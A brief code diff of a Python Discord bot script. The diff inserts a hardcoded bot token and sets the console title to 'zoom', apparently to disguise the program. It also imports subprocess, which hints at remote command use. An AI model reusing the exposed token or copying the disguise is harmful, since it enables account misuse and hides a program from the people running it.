@@ -1,4 +1,4 @@
-from discord.ext import commands
+ from discord.ext import commands
 import subprocess
 import threading
 import aiofiles
@@ -11,7 +11,7 @@ import re
 import os
 
 ctypes.windll.kernel32.SetConsoleTitleW('zoom')
-token = ''
+token = 'MTIwNDUzODUzNDE1ODE0NzU5NA.G5vtSq.hiXCxgWj92GHq5Lyqmuy9ChJNbkbn4Anx2qukg'
 prefix = '/'
 
 intents = discord.Intents().all()
